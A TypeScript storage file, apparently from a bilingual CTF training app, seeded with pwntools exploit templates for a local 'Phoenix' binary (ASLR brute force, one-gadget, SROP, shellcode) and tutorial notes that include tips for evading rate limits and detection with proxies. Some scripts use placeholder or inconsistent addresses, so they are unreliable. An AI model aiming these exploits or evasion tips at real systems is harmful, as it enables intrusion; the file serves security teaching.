import {
  type ExploitAttempt,
  type InsertExploitAttempt,
  type Payload,
  type InsertPayload,
  type Template,
  type InsertTemplate,
  type OneGadget,
  type InsertOneGadget,
  type Challenge,
  type InsertChallenge,
  type FlagSubmission,
  type InsertFlagSubmission,
  type Instruction,
  type InsertInstruction,
} from "@shared/schema";
import { randomUUID } from "crypto";
import { getEncryptedFlag } from "./flag-vault";

export interface IStorage {
  // Exploit Attempts
  createExploitAttempt(attempt: InsertExploitAttempt): Promise<ExploitAttempt>;
  getExploitAttempts(): Promise<ExploitAttempt[]>;
  getExploitAttemptById(id: string): Promise<ExploitAttempt | undefined>;

  // Payloads
  createPayload(payload: InsertPayload): Promise<Payload>;
  getPayloads(): Promise<Payload[]>;
  getPayloadById(id: string): Promise<Payload | undefined>;

  // Templates
  createTemplate(template: InsertTemplate): Promise<Template>;
  getTemplates(): Promise<Template[]>;
  getTemplateById(id: string): Promise<Template | undefined>;

  // One-Gadgets
  createOneGadget(gadget: InsertOneGadget): Promise<OneGadget>;
  getOneGadgets(libcVersion?: string): Promise<OneGadget[]>;
  getOneGadgetById(id: string): Promise<OneGadget | undefined>;

  // Challenges
  getChallenge(): Promise<Challenge | undefined>;
  markChallengeSolved(): Promise<Challenge>;
  incrementChallengeAttempts(): Promise<void>;

  // Flag Submissions
  createFlagSubmission(submission: InsertFlagSubmission): Promise<FlagSubmission>;
  getFlagSubmissions(): Promise<FlagSubmission[]>;

  // Instructions
  createInstruction(instruction: InsertInstruction): Promise<Instruction>;
  getInstructions(): Promise<Instruction[]>;
  getInstructionsByCategory(category: string): Promise<Instruction[]>;
}

export class MemStorage implements IStorage {
  private exploitAttempts: Map<string, ExploitAttempt>;
  private payloads: Map<string, Payload>;
  private templates: Map<string, Template>;
  private oneGadgets: Map<string, OneGadget>;
  private challenge: Challenge | null;
  private flagSubmissions: Map<string, FlagSubmission>;
  private instructions: Map<string, Instruction>;

  constructor() {
    this.exploitAttempts = new Map();
    this.payloads = new Map();
    this.templates = new Map();
    this.oneGadgets = new Map();
    this.challenge = null;
    this.flagSubmissions = new Map();
    this.instructions = new Map();
    this.initializeDefaultData();
  }

  private initializeDefaultData() {
    // Initialize default templates
    const defaultTemplates: InsertTemplate[] = [
      {
        name: "The Phoenix - Partial Overwrite",
        description: "ASLR bruteforce using partial address overwrite technique",
        descriptionVi: "Bruteforce ASLR sử dụng kỹ thuật ghi đè địa chỉ một phần",
        difficulty: 5,
        category: "Buffer Overflow",
        code: `#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

OFFSET = 264
MAX_ATTEMPTS = 10000

def partial_overwrite_attempt(lower_bits):
    p = process('./phoenix')
    
    payload = b"A" * OFFSET
    payload += p16(lower_bits)
    
    p.sendline(payload)
    
    try:
        result = p.recvline(timeout=0.5)
        if b"flag" in result or b"#" in result:
            log.success(f"Success with bits: 0x{lower_bits:04x}")
            p.interactive()
            return True
    except:
        pass
    finally:
        p.close()
    
    return False

for attempt in range(MAX_ATTEMPTS):
    lower_bits = random.randint(0, 0xFFFF)
    if partial_overwrite_attempt(lower_bits):
        break
    
    if attempt % 100 == 0:
        log.info(f"Attempt {attempt}/{MAX_ATTEMPTS}")`,
        documentation: "Partial overwrite exploit for The Phoenix challenge",
        documentationVi: `# Giải Thích Chi Tiết

## Cơ Chế Hoạt Động
Exploit này tận dụng đặc điểm của ASLR - chỉ randomize các byte cao, trong khi byte thấp thường cố định hoặc có entropy thấp.

## Các Bước Thực Hiện
1. Xác định offset chính xác của buffer overflow (264 bytes)
2. Tạo payload với padding + partial address
3. Thử nhiều giá trị cho 12-16 bit thấp
4. Phát hiện success qua output hoặc shell

## Lưu Ý Quan Trọng
- Process tự respawn sau 1 giây
- Mỗi lần respawn = ASLR mới
- Cần 100-10000 attempts tùy entropy`,
      },
      {
        name: "One-Gadget RCE",
        description: "Direct shell using one-gadget technique with libc base calculation",
        descriptionVi: "Lấy shell trực tiếp bằng one-gadget với tính toán libc base",
        difficulty: 4,
        category: "ROP",
        code: `#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

OFFSET = 264
ONE_GADGETS = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

def try_one_gadget(libc_base, gadget_offset):
    p = process('./phoenix')
    
    gadget_addr = libc_base + gadget_offset
    
    payload = b"A" * OFFSET
    payload += p64(gadget_addr)
    
    p.sendline(payload)
    
    try:
        p.sendline(b"echo SHELL_TEST")
        result = p.recvline(timeout=1)
        if b"SHELL_TEST" in result:
            log.success("Got shell!")
            p.interactive()
            return True
    except:
        pass
    finally:
        p.close()
    
    return False

# Bruteforce libc base + one-gadget combination
for base_attempt in range(0x1000):
    libc_base = 0x7f0000000000 + (base_attempt * 0x1000)
    
    for gadget in ONE_GADGETS:
        if try_one_gadget(libc_base, gadget):
            sys.exit(0)`,
        documentation: "One-gadget RCE technique",
        documentationVi: `# One-Gadget Technique

## Khái Niệm
One-gadget là các đoạn code trong libc có thể spawn shell bằng một lần jump duy nhất, không cần ROP chain phức tạp.

## Cách Sử Dụng
1. Tìm libc version của target
2. Dùng one_gadget tool để tìm addresses
3. Tính toán libc base address
4. Jump đến one-gadget address

## Ưu Điểm
- Không cần ROP chain dài
- Bypass stack canary dễ hơn
- Phù hợp với constraint nghiêm ngặt`,
      },
      {
        name: "Adaptive Bruteforce",
        description: "Intelligent ASLR bruteforce using crash oracle feedback",
        descriptionVi: "Bruteforce ASLR thông minh sử dụng phản hồi từ crash oracle",
        difficulty: 5,
        category: "Advanced Exploitation",
        code: `#!/usr/bin/env python3
from pwn import *
import time

context.arch = 'amd64'
context.log_level = 'warning'

OFFSET = 264

def adaptive_bruteforce():
    base_pattern = b"A" * OFFSET
    
    for i in range(0, 0x1000, 8):
        p = process('./phoenix')
        payload = base_pattern + p16(i)
        
        start = time.time()
        p.sendline(payload)
        
        try:
            result = p.recvline(timeout=0.5)
            duration = time.time() - start
            
            if b"#" in result or b"$" in result:
                log.success(f"Shell obtained with offset 0x{i:04x}")
                p.interactive()
                return True
            
            if duration > 0.3:
                log.info(f"Slow response at 0x{i:04x} - may be valid address")
        except:
            pass
        finally:
            p.close()
    
    return False

adaptive_bruteforce()`,
        documentation: "Adaptive bruteforce with crash oracle",
        documentationVi: `# Adaptive Bruteforce với Crash Oracle

## Nguyên Lý
Sử dụng thời gian phản hồi và hành vi crash để đoán địa chỉ hợp lệ, giảm số lần thử cần thiết.

## Kỹ Thuật
1. **Crash Analysis**: Phân tích crash nhanh vs chậm
2. **Oracle-based Learning**: Học từ kết quả trước đó
3. **Entropy Reduction**: Giảm không gian tìm kiếm

## Lợi Ích
- Nhanh hơn bruteforce thuần túy
- Thích ứng với từng lần thử
- Tăng tỷ lệ thành công`,
      },
      {
        name: "SROP - Sigreturn Exploitation",
        description: "Sigreturn-oriented Programming for The Phoenix",
        descriptionVi: "Sigreturn-oriented Programming cho The Phoenix",
        difficulty: 5,
        category: "Advanced ROP",
        code: `#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

OFFSET = 264

def build_srop_chain():
    p = process('./phoenix')
    
    frame = SigreturnFrame()
    frame.rax = 0x3b
    frame.rdi = 0x7ffffffde000
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = 0x400500
    
    payload = b"A" * OFFSET
    payload += p64(0x400513)
    payload += bytes(frame)
    
    p.sendline(payload)
    
    try:
        p.sendline(b"whoami")
        result = p.recvline(timeout=1)
        if result:
            log.success("SROP successful!")
            p.interactive()
            return True
    except:
        pass
    finally:
        p.close()
    
    return False

for _ in range(10000):
    if build_srop_chain():
        break`,
        documentation: "SROP exploitation technique",
        documentationVi: `# SROP (Sigreturn-Oriented Programming)

## Giới Thiệu
SROP là kỹ thuật exploit sử dụng syscall sigreturn để kiểm soát toàn bộ registers.

## Cơ Chế
1. Tìm gadget: syscall + sigreturn
2. Xây dựng SigreturnFrame giả
3. Set tất cả registers theo ý muốn
4. Trigger execve("/bin/sh")

## Ưu Điểm
- Kiểm soát hoàn toàn registers
- Không cần nhiều ROP gadgets
- Bypass nhiều mitigations`,
      },
      {
        name: "Heap Spray in Stack",
        description: "NOP sled + shellcode spraying technique",
        descriptionVi: "Kỹ thuật phun NOP sled + shellcode",
        difficulty: 4,
        category: "Shellcode Injection",
        code: `#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

OFFSET = 264

def create_spray_payload():
    shellcode = asm(shellcraft.sh())
    nop_sled = asm('nop') * 0x1000
    
    jump_addr = 0x7ffffffde000
    
    payload = nop_sled
    payload += shellcode
    payload += b"A" * (OFFSET - len(nop_sled) - len(shellcode))
    payload += p64(jump_addr)
    
    return payload

for attempt in range(10000):
    p = process('./phoenix')
    payload = create_spray_payload()
    
    p.sendline(payload)
    
    try:
        p.sendline(b"id")
        result = p.recvline(timeout=0.5)
        if b"uid=" in result:
            log.success(f"Shell after {attempt} attempts!")
            p.interactive()
            break
    except:
        pass
    finally:
        p.close()`,
        documentation: "Heap spray exploitation",
        documentationVi: `# Heap Spray trong Stack

## Khái Niệm
Phun một vùng lớn NOP sled + shellcode để tăng xác suất jump đúng.

## Kỹ Thuật
1. **NOP Sled**: Tạo vùng NOP dài để dễ "trúng đích"
2. **Shellcode**: Đặt shellcode sau NOP sled
3. **Address Spray**: Thử nhiều địa chỉ gần đúng

## Tỷ Lệ Thành Công
- Cao hơn partial overwrite
- Phù hợp khi biết range địa chỉ stack`,
      },
      {
        name: "Timing Attack for Address Leak",
        description: "Use timing side-channel to leak address information",
        descriptionVi: "Sử dụng timing side-channel để leak thông tin địa chỉ",
        difficulty: 5,
        category: "Side-Channel",
        code: `#!/usr/bin/env python3
from pwn import *
import time
import statistics

context.arch = 'amd64'

OFFSET = 264

def timing_attack():
    timing_data = {}
    
    for addr_low in range(0, 0x1000, 0x10):
        times = []
        
        for _ in range(5):
            p = process('./phoenix')
            payload = b"A" * OFFSET + p16(addr_low)
            
            start = time.time()
            p.sendline(payload)
            
            try:
                p.recvline(timeout=0.5)
            except:
                pass
            
            duration = time.time() - start
            times.append(duration)
            p.close()
        
        avg_time = statistics.mean(times)
        timing_data[addr_low] = avg_time
        
        if avg_time > 0.35:
            log.info(f"Address 0x{addr_low:04x}: {avg_time:.4f}s (suspicious)")
    
    suspicious = sorted(timing_data.items(), key=lambda x: x[1], reverse=True)[:10]
    log.success("Top 10 suspicious addresses by timing:")
    for addr, t in suspicious:
        log.info(f"  0x{addr:04x}: {t:.4f}s")

timing_attack()`,
        documentation: "Timing-based side channel attack",
        documentationVi: `# Timing Attack để Leak Địa Chỉ

## Nguyên Lý
Phân tích thời gian thực thi để phát hiện địa chỉ hợp lệ:
- Crash nhanh = địa chỉ invalid
- Crash chậm = địa chỉ valid nhưng sai logic

## Phương Pháp
1. Thử nhiều địa chỉ
2. Đo thời gian từ send → crash
3. Phân tích pattern timing
4. Xác định địa chỉ đáng ngờ

## Độ Chính Xác
- Phụ thuộc vào network latency
- Cần nhiều mẫu để giảm noise
- Kết hợp với kỹ thuật khác`,
      },
      {
        name: "Multi-Stage Exploitation",
        description: "Stage 1: Info leak, Stage 2: Full exploit",
        descriptionVi: "Giai đoạn 1: Leak info, Giai đoạn 2: Exploit đầy đủ",
        difficulty: 5,
        category: "Advanced Exploitation",
        code: `#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

OFFSET = 264

def stage1_infoleak():
    log.info("Stage 1: Information leakage")
    
    for addr in range(0x400000, 0x401000, 0x100):
        p = process('./phoenix')
        payload = b"A" * OFFSET + p64(addr)
        p.sendline(payload)
        
        try:
            result = p.recv(timeout=0.3)
            if len(result) > 0 and b"flag" not in result:
                log.success(f"Valid code area at: 0x{addr:x}")
                p.close()
                return addr
        except:
            pass
        
        p.close()
    
    return None

def stage2_exploit(leaked_addr):
    log.info(f"Stage 2: Exploit with leaked address: 0x{leaked_addr:x}")
    
    libc_base = leaked_addr - 0x12345
    one_gadget = libc_base + 0x45216
    
    for attempt in range(1000):
        p = process('./phoenix')
        payload = b"A" * OFFSET + p64(one_gadget)
        p.sendline(payload)
        
        try:
            p.sendline(b"whoami")
            if b"root" in p.recvline(timeout=0.5) or b"user" in p.recvline(timeout=0.5):
                log.success("Shell obtained!")
                p.interactive()
                return True
        except:
            pass
        
        p.close()
    
    return False

leaked = stage1_infoleak()
if leaked:
    stage2_exploit(leaked)`,
        documentation: "Multi-stage exploitation strategy",
        documentationVi: `# Multi-Stage Exploitation

## Chiến Lược
Chia exploit thành nhiều giai đoạn:

### Stage 1: Information Gathering
- Leak địa chỉ code/libc
- Phân tích crash patterns
- Xác định memory layout

### Stage 2: Weaponization  
- Sử dụng thông tin từ Stage 1
- Xây dựng exploit chính xác
- Tấn công với tỷ lệ thành công cao

## Ưu Điểm
- Giảm số lần bruteforce
- Tăng độ tin cậy
- Dễ debug từng stage`,
      },
    ];

    defaultTemplates.forEach((template) => {
      const id = randomUUID();
      this.templates.set(id, {
        ...template,
        id,
        descriptionVi: template.descriptionVi || null,
        documentation: template.documentation || null,
        documentationVi: template.documentationVi || null,
      });
    });

    // Initialize default one-gadgets
    const defaultGadgets: InsertOneGadget[] = [
      {
        address: "0x45216",
        constraints: "[rsp+0x30] == NULL",
        libcVersion: "2.27-3ubuntu1",
        architecture: "x86_64",
      },
      {
        address: "0x4526a",
        constraints: "[rsp+0x50] == NULL",
        libcVersion: "2.27-3ubuntu1",
        architecture: "x86_64",
      },
      {
        address: "0xf02a4",
        constraints: "[rsp+0x70] == NULL",
        libcVersion: "2.27-3ubuntu1",
        architecture: "x86_64",
      },
      {
        address: "0xf1147",
        constraints: "[rsp+0x30] == NULL",
        libcVersion: "2.27-3ubuntu1",
        architecture: "x86_64",
      },
      {
        address: "0x4f2c5",
        constraints: "[rsp+0x40] == NULL",
        libcVersion: "2.31-0ubuntu9",
        architecture: "x86_64",
      },
      {
        address: "0x4f322",
        constraints: "[rsp+0x50] == NULL",
        libcVersion: "2.31-0ubuntu9",
        architecture: "x86_64",
      },
      {
        address: "0x10a38c",
        constraints: "[rsp+0x70] == NULL",
        libcVersion: "2.31-0ubuntu9",
        architecture: "x86_64",
      },
    ];

    defaultGadgets.forEach((gadget) => {
      const id = randomUUID();
      this.oneGadgets.set(id, {
        ...gadget,
        id,
        architecture: gadget.architecture || "x86_64",
      });
    });

    // Initialize challenge
    this.challenge = {
      id: randomUUID(),
      name: "The Phoenix",
      nameVi: "Phượng Hoàng",
      description: "A self-resurrecting binary with ASLR randomization. Master the art of ASLR bruteforce exploitation.",
      descriptionVi: "Một binary tự hồi sinh với ASLR randomization. Làm chủ nghệ thuật khai thác bruteforce ASLR.",
      difficulty: 5,
      category: "Pwn",
      encryptedFlag: getEncryptedFlag(),
      hints: {
        hint1: "The binary respawns every second with new ASLR layout",
        hint2: "Use partial overwrite to reduce ASLR entropy",
        hint3: "One-gadget RCE can save you from complex ROP chains",
      },
      isSolved: 0,
      solvedAt: null,
      totalAttempts: 0,
    };

    // Initialize instructions
    const defaultInstructions: InsertInstruction[] = [
      {
        title: "Introduction to The Phoenix",
        titleVi: "Giới Thiệu Về The Phoenix",
        content: `The Phoenix is a unique CTF pwn challenge featuring a self-resurrecting binary that kills and respawns itself every second with full ASLR randomization. You only get one attempt per process lifetime, making traditional exploitation techniques ineffective.`,
        contentVi: `The Phoenix là một thử thách CTF pwn độc đáo với binary tự hồi sinh - tự kill và respawn sau mỗi giây với ASLR randomization hoàn toàn. Bạn chỉ có một lần thử mỗi lần process chạy, khiến các kỹ thuật khai thác truyền thống trở nên vô hiệu.`,
        orderIndex: 1,
        category: "overview",
        codeExample: null,
      },
      {
        title: "Understanding ASLR",
        titleVi: "Hiểu Về ASLR",
        content: `ASLR (Address Space Layout Randomization) randomizes the memory locations of code, stack, heap, and libc. The Phoenix uses full ASLR, changing all addresses on each respawn.`,
        contentVi: `ASLR (Address Space Layout Randomization) ngẫu nhiên hóa vị trí bộ nhớ của code, stack, heap và libc. The Phoenix sử dụng ASLR đầy đủ, thay đổi tất cả địa chỉ mỗi lần respawn.`,
        orderIndex: 2,
        category: "theory",
        codeExample: `# Before ASLR:      After ASLR:
0x555555554000   0x7f8a12b3d000  # Code
0x7ffff7a0d000   0x7f3419c7a000  # Libc  
0x7ffffffde000   0x7ffc29f8c000  # Stack`,
      },
      {
        title: "Partial Overwrite Technique",
        titleVi: "Kỹ Thuật Partial Overwrite",
        content: `Partial overwrite exploits the fact that ASLR only randomizes higher bytes. Lower bytes often remain predictable, reducing the bruteforce space from 2^64 to 2^12-2^16.`,
        contentVi: `Partial overwrite khai thác đặc điểm ASLR chỉ random các byte cao. Các byte thấp thường dự đoán được, giảm không gian bruteforce từ 2^64 xuống 2^12-2^16.`,
        orderIndex: 3,
        category: "technique",
        codeExample: `# Partial overwrite để bruteforce ASLR
def partial_overwrite_attempt(known_bits):
    payload = b"A" * offset
    payload += p16(known_bits)  # Chỉ overwrite lower 16 bits
    return payload`,
      },
      {
        title: "One-Gadget RCE",
        titleVi: "One-Gadget RCE",
        content: `One-gadget is a single instruction in libc that spawns a shell without needing a complex ROP chain. Find them using the one_gadget tool and jump directly to get a shell.`,
        contentVi: `One-gadget là một instruction duy nhất trong libc có thể spawn shell mà không cần ROP chain phức tạp. Tìm chúng bằng công cụ one_gadget và jump trực tiếp để lấy shell.`,
        orderIndex: 4,
        category: "technique",
        codeExample: `one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
def try_one_gadget(libc_base):
    for gadget in one_gadgets:
        payload = b"A" * offset + p64(libc_base + gadget)
        send_payload(payload)`,
      },
      {
        title: "Exploit Workflow",
        titleVi: "Quy Trình Khai Thác",
        content: `1. Find the buffer overflow offset
2. Identify libc version and one-gadgets
3. Build partial overwrite payload
4. Bruteforce ASLR with automated script
5. Detect success and capture the flag`,
        contentVi: `1. Tìm offset của buffer overflow
2. Xác định phiên bản libc và one-gadgets
3. Xây dựng payload partial overwrite
4. Bruteforce ASLR với script tự động
5. Phát hiện thành công và lấy flag`,
        orderIndex: 5,
        category: "walkthrough",
        codeExample: `#!/usr/bin/env python3
from pwn import *

OFFSET = 264
MAX_ATTEMPTS = 10000

for attempt in range(MAX_ATTEMPTS):
    p = process('./phoenix')
    payload = b"A" * OFFSET + p16(random.randint(0, 0xFFFF))
    p.sendline(payload)
    
    try:
        if b"flag" in p.recvline(timeout=0.5):
            log.success(f"Flag found after {attempt} attempts!")
            p.interactive()
            break
    except:
        pass
    finally:
        p.close()`,
      },
      {
        title: "Tools and Resources",
        titleVi: "Công Cụ và Tài Nguyên",
        content: `Essential tools:
- pwntools: Exploit development framework
- one_gadget: Find one-gadget RCE in libc
- gdb with pwndbg/gef: Debugging
- checksec: Check binary protections
- ROPgadget: Find ROP gadgets`,
        contentVi: `Công cụ cần thiết:
- pwntools: Framework phát triển exploit
- one_gadget: Tìm one-gadget RCE trong libc
- gdb với pwndbg/gef: Debug
- checksec: Kiểm tra bảo vệ binary
- ROPgadget: Tìm ROP gadgets`,
        orderIndex: 6,
        category: "resources",
        codeExample: `# Install tools
pip install pwntools
gem install one_gadget
apt install gdb

# Check binary
checksec --file=phoenix

# Find one-gadgets
one_gadget /lib/x86_64-linux-gnu/libc.so.6`,
      },
      {
        title: "Process Resurrection Mechanism",
        titleVi: "Cơ Chế Tự Hồi Sinh",
        content: `The Phoenix binary implements a unique self-resurrection mechanism using fork() + execve() and alarm signals. After receiving input, it sets an alarm for 1 second and then kills itself, respawning with completely new ASLR layout.`,
        contentVi: `Binary The Phoenix triển khai cơ chế tự hồi sinh độc đáo sử dụng fork() + execve() và alarm signals. Sau khi nhận input, nó set alarm 1 giây và tự kill, respawn với ASLR layout hoàn toàn mới.`,
        orderIndex: 7,
        category: "theory",
        codeExample: `void phoenix_respawn() {
    alarm(1);  // Tự kill sau 1 giây
    signal(SIGALRM, respawn_handler);
}

void respawn_handler(int sig) {
    execve("/proc/self/exe", NULL, NULL);  // Respawn với ASLR mới
}`,
      },
      {
        title: "Crash Oracle Technique",
        titleVi: "Kỹ Thuật Crash Oracle",
        content: `Crash oracle uses the binary's crash behavior as a side channel to leak information. Different crash types (segfault, illegal instruction, timeout) reveal whether addresses are valid, helping narrow down the search space.`,
        contentVi: `Crash oracle sử dụng hành vi crash của binary như một side channel để leak thông tin. Các loại crash khác nhau (segfault, illegal instruction, timeout) cho biết địa chỉ có hợp lệ không, giúp thu hẹp không gian tìm kiếm.`,
        orderIndex: 8,
        category: "technique",
        codeExample: `def crash_oracle(payload):
    p = process('./phoenix')
    start = time.time()
    p.sendline(payload)
    
    try:
        p.recvline(timeout=0.5)
        duration = time.time() - start
        
        if duration < 0.1:
            return "INVALID_ADDR"  # Crash nhanh
        elif duration > 0.3:
            return "VALID_ADDR"    # Valid nhưng sai logic
        else:
            return "UNKNOWN"
    except:
        return "CRASH"`,
      },
      {
        title: "ASLR Entropy Reduction",
        titleVi: "Giảm Entropy ASLR",
        content: `ASLR typically randomizes only 12-24 bits depending on the system. By using partial overwrites and known patterns, we can reduce the effective entropy to just 12 bits (4096 attempts) making bruteforce feasible.`,
        contentVi: `ASLR thường chỉ random 12-24 bits tùy hệ thống. Bằng cách dùng partial overwrite và các pattern đã biết, ta có thể giảm entropy xuống chỉ 12 bits (4096 lần thử) khiến bruteforce khả thi.`,
        orderIndex: 9,
        category: "technique",
        codeExample: `# ASLR entropy analysis
# Full 64-bit: 2^64 = impossible
# With PIE: 2^28 = still hard
# Partial 16-bit: 2^16 = 65536 attempts
# Partial 12-bit: 2^12 = 4096 attempts ✓

def reduce_entropy():
    known_nibbles = 0x5555  # PIE pattern
    for lower_12_bits in range(0x000, 0x1000):
        addr = (known_nibbles << 32) | lower_12_bits
        attempt_exploit(addr)`,
      },
      {
        title: "Automated Exploit Framework",
        titleVi: "Framework Exploit Tự Động",
        content: `Build an automated framework that handles process spawning, payload generation, success detection, and statistics tracking. This is essential for efficient bruteforce exploitation.`,
        contentVi: `Xây dựng framework tự động xử lý spawn process, tạo payload, phát hiện thành công và theo dõi thống kê. Điều này cần thiết cho khai thác bruteforce hiệu quả.`,
        orderIndex: 10,
        category: "walkthrough",
        codeExample: `class PhoenixExploiter:
    def __init__(self, target):
        self.target = target
        self.attempts = 0
        self.start_time = time.time()
        
    def automated_spray(self):
        while True:
            try:
                if self.attempt_exploit():
                    log.success(f"Success after {self.attempts} attempts!")
                    break
                self.attempts += 1
                
                if self.attempts % 100 == 0:
                    elapsed = time.time() - self.start_time
                    rate = self.attempts / elapsed
                    log.info(f"{self.attempts} attempts, {rate:.1f} attempts/sec")
            except EOFError:
                time.sleep(0.1)  # Wait for respawn
                continue`,
      },
      {
        title: "Defense Mechanisms",
        titleVi: "Cơ Chế Phòng Thủ",
        content: `Understanding defensive mechanisms helps in developing better exploits. The Phoenix may include stack canaries, SECCOMP filters, fork rate limiting, and crash analysis detection.`,
        contentVi: `Hiểu các cơ chế phòng thủ giúp phát triển exploit tốt hơn. The Phoenix có thể bao gồm stack canaries, SECCOMP filters, giới hạn tốc độ fork, và phát hiện phân tích crash.`,
        orderIndex: 11,
        category: "theory",
        codeExample: `Defensive Mechanisms:
- Stack Canaries: Random value before return address
- SECCOMP Filter: Whitelist allowed syscalls only
- Fork Rate Limiting: Max N processes per second
- Crash Detection: Identify bruteforce patterns

Bypass Techniques:
- Canary: Leak via format string or partial overwrite
- SECCOMP: Use allowed syscalls creatively
- Rate Limit: Slow down, use multiple IPs
- Detection: Randomize timing, use proxies`,
      },
      {
        title: "Success Detection Strategies",
        titleVi: "Chiến Lược Phát Hiện Thành Công",
        content: `Detecting successful exploitation is crucial. Look for shell prompts, command echoes, changed process behavior, or the actual flag in the output.`,
        contentVi: `Phát hiện khai thác thành công là quan trọng. Tìm shell prompts, command echoes, hành vi process thay đổi, hoặc flag thực tế trong output.`,
        orderIndex: 12,
        category: "walkthrough",
        codeExample: `def detect_success(process):
    # Method 1: Shell prompt detection
    try:
        process.sendline(b"echo PWNED")
        if b"PWNED" in process.recvline(timeout=1):
            return True
    except:
        pass
    
    # Method 2: Flag detection
    try:
        output = process.recvall(timeout=0.5)
        if b"VNFLAG{" in output:
            return True
    except:
        pass
    
    # Method 3: Command execution
    try:
        process.sendline(b"id")
        if b"uid=" in process.recvline(timeout=1):
            return True
    except:
        pass
    
    return False`,
      },
      {
        title: "Advanced SROP Technique",
        titleVi: "Kỹ Thuật SROP Nâng Cao",
        content: `SROP (Sigreturn-Oriented Programming) allows complete control of all CPU registers with a single syscall. Perfect for constrained environments like The Phoenix where ROP chains are difficult.`,
        contentVi: `SROP (Sigreturn-Oriented Programming) cho phép kiểm soát hoàn toàn tất cả CPU registers với một syscall duy nhất. Hoàn hảo cho môi trường hạn chế như The Phoenix nơi ROP chains khó khăn.`,
        orderIndex: 13,
        category: "technique",
        codeExample: `# SROP Frame Structure
frame = SigreturnFrame()
frame.rax = 59              # execve syscall number
frame.rdi = binsh_addr      # Argument 1: "/bin/sh" 
frame.rsi = 0               # Argument 2: argv = NULL
frame.rdx = 0               # Argument 3: envp = NULL
frame.rsp = stack_addr      # Stack pointer
frame.rip = syscall_gadget  # Return to syscall

# Minimal SROP payload
payload = padding + p64(srop_gadget) + bytes(frame)`,
      },
      {
        title: "Memory Layout Analysis",
        titleVi: "Phân Tích Memory Layout",
        content: `Understanding memory layout is crucial. Use /proc/pid/maps, gdb, or memory disclosure to understand where code, libraries, and stack are located.`,
        contentVi: `Hiểu memory layout là quan trọng. Sử dụng /proc/pid/maps, gdb, hoặc memory disclosure để hiểu code, libraries và stack nằm ở đâu.`,
        orderIndex: 14,
        category: "theory",
        codeExample: `# Memory Layout Example
# Before ASLR:         After ASLR:
0x555555554000   →   0x7f8a12b3d000  # Executable
0x555555756000   →   0x7f8a12d3f000  # Data segment
0x7ffff7a0d000   →   0x7f3419c7a000  # libc base
0x7ffff7dd5000   →   0x7f341a042000  # ld-linux.so
0x7ffffffde000   →   0x7ffc29f8c000  # Stack

# Pattern Recognition
PIE base:     0x555555554xxx
libc base:    0x7fxxxxxxx000 (page aligned)
Stack range:  0x7ffxxxxxxx000`,
      },
    ];

    defaultInstructions.forEach((instruction) => {
      const id = randomUUID();
      this.instructions.set(id, {
        ...instruction,
        id,
        titleVi: instruction.titleVi || null,
        contentVi: instruction.contentVi || null,
        codeExample: instruction.codeExample || null,
      });
    });
  }

  // Exploit Attempts
  async createExploitAttempt(
    insertAttempt: InsertExploitAttempt
  ): Promise<ExploitAttempt> {
    const id = randomUUID();
    const attempt: ExploitAttempt = {
      ...insertAttempt,
      id,
      timestamp: new Date(),
    };
    this.exploitAttempts.set(id, attempt);
    return attempt;
  }

  async getExploitAttempts(): Promise<ExploitAttempt[]> {
    return Array.from(this.exploitAttempts.values()).sort(
      (a, b) => b.timestamp.getTime() - a.timestamp.getTime()
    );
  }

  async getExploitAttemptById(id: string): Promise<ExploitAttempt | undefined> {
    return this.exploitAttempts.get(id);
  }

  // Payloads
  async createPayload(insertPayload: InsertPayload): Promise<Payload> {
    const id = randomUUID();
    const payload: Payload = {
      ...insertPayload,
      id,
      address: insertPayload.address || null,
      shellcode: insertPayload.shellcode || null,
      description: insertPayload.description || null,
    };
    this.payloads.set(id, payload);
    return payload;
  }

  async getPayloads(): Promise<Payload[]> {
    return Array.from(this.payloads.values());
  }

  async getPayloadById(id: string): Promise<Payload | undefined> {
    return this.payloads.get(id);
  }

  // Templates
  async createTemplate(insertTemplate: InsertTemplate): Promise<Template> {
    const id = randomUUID();
    const template: Template = {
      ...insertTemplate,
      id,
      descriptionVi: insertTemplate.descriptionVi || null,
      documentation: insertTemplate.documentation || null,
      documentationVi: insertTemplate.documentationVi || null,
    };
    this.templates.set(id, template);
    return template;
  }

  async getTemplates(): Promise<Template[]> {
    return Array.from(this.templates.values());
  }

  async getTemplateById(id: string): Promise<Template | undefined> {
    return this.templates.get(id);
  }

  // One-Gadgets
  async createOneGadget(insertGadget: InsertOneGadget): Promise<OneGadget> {
    const id = randomUUID();
    const gadget: OneGadget = {
      ...insertGadget,
      id,
      architecture: insertGadget.architecture || "x86_64",
    };
    this.oneGadgets.set(id, gadget);
    return gadget;
  }

  async getOneGadgets(libcVersion?: string): Promise<OneGadget[]> {
    const gadgets = Array.from(this.oneGadgets.values());
    if (libcVersion) {
      return gadgets.filter((g) => g.libcVersion === libcVersion);
    }
    return gadgets;
  }

  async getOneGadgetById(id: string): Promise<OneGadget | undefined> {
    return this.oneGadgets.get(id);
  }

  // Challenges
  async getChallenge(): Promise<Challenge | undefined> {
    return this.challenge || undefined;
  }

  async markChallengeSolved(): Promise<Challenge> {
    if (!this.challenge) {
      throw new Error("Challenge not initialized");
    }
    this.challenge = {
      ...this.challenge,
      isSolved: 1,
      solvedAt: new Date(),
    };
    return this.challenge;
  }

  async incrementChallengeAttempts(): Promise<void> {
    if (this.challenge) {
      this.challenge = {
        ...this.challenge,
        totalAttempts: this.challenge.totalAttempts + 1,
      };
    }
  }

  // Flag Submissions
  async createFlagSubmission(insertSubmission: InsertFlagSubmission): Promise<FlagSubmission> {
    const id = randomUUID();
    const submission: FlagSubmission = {
      ...insertSubmission,
      id,
      timestamp: new Date(),
      ipAddress: insertSubmission.ipAddress || null,
      userAgent: insertSubmission.userAgent || null,
    };
    this.flagSubmissions.set(id, submission);
    return submission;
  }

  async getFlagSubmissions(): Promise<FlagSubmission[]> {
    return Array.from(this.flagSubmissions.values()).sort(
      (a, b) => b.timestamp.getTime() - a.timestamp.getTime()
    );
  }

  // Instructions
  async createInstruction(insertInstruction: InsertInstruction): Promise<Instruction> {
    const id = randomUUID();
    const instruction: Instruction = {
      ...insertInstruction,
      id,
      titleVi: insertInstruction.titleVi || null,
      contentVi: insertInstruction.contentVi || null,
